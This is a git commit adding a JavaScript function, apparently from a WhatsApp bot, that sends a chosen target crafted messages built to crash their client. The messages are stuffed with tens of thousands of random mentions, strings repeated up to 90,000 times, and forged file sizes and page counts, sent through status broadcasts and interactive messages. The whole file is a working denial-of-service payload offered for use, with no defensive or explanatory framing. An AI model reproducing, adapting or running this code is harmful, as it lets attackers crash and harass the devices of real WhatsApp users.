79608c4a2010a065b13c82238353b9365e536299
PRIME XUU <ruinvyet@gmail.com>
2026-01-12 18:25:53 +0800

    upload Function07.js

---
+++ img/func/Function07.js
@@ -0,0 +1,194 @@
+async function Dembele(sock, target, mention = true, ptcp = true) {
+    const mentionedList = [
+        "13135550002@s.whatsapp.net",
+        ...Array.from({ length: 40000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+
+    const embeddedMusic = {
+        musicContentMediaId: "589608164114571",
+        songId: "870166291800508",
+        author: "Lucifer Is Here 🕊️" + "ោ៝".repeat(10000),
+        title: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺 ",
+        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+        artistAttribution: "https://www.youtube.com/LuciferGanteng",
+        countryBlocklist: true,
+        isExplicit: true,
+        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+    };
+
+    const videoMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?...",
+        mimetype: "video/mp4",
+        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
+        fileLength: "1515940",
+        seconds: 14,
+        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
+        height: 1280,
+        width: 720,
+        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
+        directPath: "/v/t62.7161-24/19384532_...enc?...",
+        mediaKeyTimestamp: "1748276788",
+        contextInfo: { isSampled: true, mentionedJid: mentionedList },
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363321780343299@newsletter",
+            serverMessageId: 1,
+            newsletterName: "LUCIFER'Z"
+        },
+        streamingSidecar: "IbapKv/...",
+        thumbnailDirectPath: "/v/t62.36147-24/20095859_...enc?...",
+        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
+        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
+        annotations: [{
+            embeddedContent: { embeddedMusic },
+            embeddedAction: true
+        }]
+    };
+
+    const stickerMessage = {
+        stickerMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_...enc?...",
+            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+            mimetype: "image/webp",
+            directPath: "/v/t62.7161-24/10000000_...enc?...",
+            fileLength: { low: 1, high: 0, unsigned: true },
+            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+            firstFrameLength: 19904,
+            firstFrameSidecar: "KN4kQ5pyABRAgA==",
+            isAnimated: true,
+            isAvatar: false,
+            isAiSticker: false,
+            isLottie: false,
+            contextInfo: {
+                mentionedJid: mentionedList
+            }
+        }
+    };
+
+    const audioMessage = {
+        audioMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_...enc?...",
+            mimetype: "audio/mpeg",
+            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
+            fileLength: "389948",
+            seconds: 24,
+            ptt: false,
+            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
+            caption: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺",
+            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
+        }
+    };
+
+    const msg1 = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
+    const msg2 = await generateWAMessageFromContent(target, { viewOnceMessage: { message: stickerMessage } }, {});
+    const msg3 = await generateWAMessageFromContent(target, audioMessage, {});
+
+    for (const msg of [msg1, msg2, msg3]) {
+        await sock.relayMessage("status@broadcast", msg.message, {
+            messageId: msg.key.id,
+            statusJidList: [target],
+            additionalNodes: [{
+                tag: "meta",
+                attrs: {},
+                content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
+            }]
+        });
+    }
+
+    if (mention) {
+        await sock.relayMessage(target, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg1.key,
+                        type: 25
+                    }
+                }
+            }
+        }, {
+            additionalNodes: [{
+                tag: "meta",
+                attrs: { is_status_mention: "true" }
+            }]
+        });
+    }
+
+    const crashNotif = "ꦽ".repeat(55555);
+    const Neptune = `_*~@8~*_\n`.repeat(10500);
+    await sock.relayMessage(target, {
+        ephemeralMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_...enc?...",
+                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                            fileLength: "9999999999999",
+                            pageCount: 1316134911,
+                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                            fileName: "Agency",
+                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                            directPath: "/v/t62.7119-24/30958033_...enc?...",
+                            mediaKeyTimestamp: "1726867151",
+                            contactVcard: true
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: { text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺" + crashNotif + Neptune },
+                    footer: { text: "" },
+                    contextInfo: {
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+                        ],
+                        fromMe: false,
+                        quotedMessage: {
+                            documentMessage: {
+                                fileName: "",
+                                fileLength: "9999999999999"
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }, ptcp ? { participant: { jid: target } } : {});
+
+    const virtex = " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏ꦾ".repeat(90000) + "@8".repeat(90000);
+    await sock.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_...enc?...",
+                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "Roo",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: "/v/t62.7119-24/30578306_...enc?...",
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: { text: virtex },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } });
+}
